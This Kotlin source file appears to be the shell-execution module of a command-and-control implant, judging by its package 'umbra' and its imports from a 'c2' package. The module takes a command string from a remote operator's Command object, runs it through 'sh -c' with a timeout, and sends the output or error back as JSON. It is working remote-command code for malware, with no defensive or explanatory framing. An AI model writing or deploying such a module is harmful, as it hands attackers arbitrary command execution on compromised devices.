package dev.yassine.umbra.modules

import dev.yassine.umbra.c2.Command
import dev.yassine.umbra.c2.CommandResult
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import java.io.BufferedReader
import java.io.InputStreamReader

object ShellModule {

    private val json = Json { prettyPrint = false }

    suspend fun exec(cmd: Command): String = withContext(Dispatchers.IO) {
        val command = cmd.params["cmd"] ?: "id"
        val timeout = (cmd.params["timeout"]?.toIntOrNull() ?: 10) * 1000L

        try {
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val errReader = BufferedReader(InputStreamReader(process.errorStream))
            val output = StringBuilder()
            val errorOutput = StringBuilder()

            val finished = process.waitFor(timeout, java.util.concurrent.TimeUnit.MILLISECONDS)
            if (!finished) {
                process.destroyForcibly()
                return@withContext json.encodeToString(CommandResult.serializer(),
                    CommandResult(cmd.cmd_id, "error", "", "timeout"))
            }

            var line: String?
            while (reader.readLine().also { line = it } != null) output.appendLine(line)
            while (errReader.readLine().also { line = it } != null) errorOutput.appendLine(line)

            val result = if (errorOutput.isNotEmpty()) errorOutput.toString().trim()
                else output.toString().trim()

            json.encodeToString(CommandResult.serializer(),
                CommandResult(cmd.cmd_id, "ok", result))
        } catch (e: Exception) {
            json.encodeToString(CommandResult.serializer(),
                CommandResult(cmd.cmd_id, "error", "", "shell:${e.message}"))
        }
    }
}
